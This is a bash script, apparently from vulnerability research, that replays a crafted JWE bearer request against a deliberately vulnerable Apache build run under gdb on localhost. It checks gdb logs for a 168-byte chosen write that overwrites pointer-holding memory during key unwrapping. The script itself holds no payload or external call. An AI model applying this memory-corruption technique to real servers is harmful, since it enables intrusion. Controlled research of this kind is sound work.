#!/bin/bash
# W220: identify the far pointer-holding object overwritten by the W219b
# 168-byte chosen write. One crafted A128GCM bearer request through a fresh
# gdb-started Apache on 127.0.0.1:18444; no other target is contacted.
set -eu
T=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
W2=$(CDPATH= cd -- "$T/.." && pwd)
GDBPIDS=""
PASS=0
FAIL=0
mkdir -p "$T/evidence" "$T/run" "$T/cache" "$T/html"
sed -e "s|@W2@|$W2|g" -e "s|@T@|$T|g" "$T/apache-w219.conf" > "$T/apache-vuln.run.conf"
sed "s|@LOG@|$T/evidence/gdb-w220-ident.log|" "$T/gdb-w220-ident.cmd" > "$T/gdb-w220-ident.run.cmd"

cleanup() {
    if [ -f "$T/apache.pid" ]; then kill "$(cat "$T/apache.pid")" 2>/dev/null || true; rm -f "$T/apache.pid"; fi
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
}
trap cleanup EXIT INT TERM
check() {
    if [ "$2" = "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-26s observed=%s expected=%s\n' "$1" "$2" "$3"
}
atleast() {
    if [ "$2" -ge "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-26s observed=%s minimum=%s\n' "$1" "$2" "$3"
}
[ "$(ss -ltn | grep -cE ':18444 ' || true)" -eq 0 ] || { echo PORTS_BUSY >&2; exit 3; }
timeout 90 gdb -q -batch -x "$T/gdb-w220-ident.run.cmd" --args /usr/sbin/apache2 -f "$T/apache-vuln.run.conf" -X > "$T/evidence/stdout-w220-ident.log" 2>&1 &
GDBPIDS="$!"
for i in $(seq 1 200); do
    if ss -ltn | grep -q ':18444 '; then break; fi
    sleep 0.2
done
ss -ltn | grep -q ':18444 ' || { echo LISTENER_NOT_READY >&2; exit 2; }
W2_PORT=18444 W2_TAG=w220-ident timeout 30 python3 "$T/probe-w219b.py" long \
    > "$T/evidence/probe-w220-ident.log" 2>&1 || echo PROBE_FAILED >> "$T/evidence/probe-w220-failures.log"
sleep 2
for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
GDBPIDS=""
sleep 1

L="$T/evidence/gdb-w220-ident.log"
P="$T/evidence/probe-w220-ident.log"
check KW_REACHED "$(grep -c 'W220_KW_DECRYPT raw_len=176 cek_len=0 jwk_kty=3' "$L" || true)" 1
check PRE_UNWRAP "$(grep -c 'W220_PRE_UNWRAP cek=0x555555667170 target=0x5555556671f0' "$L" || true)" 1
check POST_UNWRAP "$(grep -c 'W220_POST_UNWRAP cek=0x555555667170 cek_len_before=16' "$L" || true)" 1
atleast FAR_POINTERS "$(grep -c '0x00005555556671b8' "$L" || true)" 5
atleast WATCH_TRACE "$(grep -c 'W220_WATCH ' "$L" || true)" 8
check HTTP401 "$(grep -c '401 Unauthorized' "$P" || true)" 1
check NO_SIGNAL "$(grep -c 'Program received signal' "$L" || true)" 0
printf 'W220 watchpoint trace:\n'
grep 'W220_WATCH ' "$L" || true
printf 'W220 first watchpoint backtrace:\n'
grep -A8 -m1 'W220_WATCH ' "$L" || true
printf 'REPLAY_W220_IDENT: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
ss -ltn | grep -E ':18444 ' || echo NO_LISTENER_LEFT
[ "$FAIL" -eq 0 ]
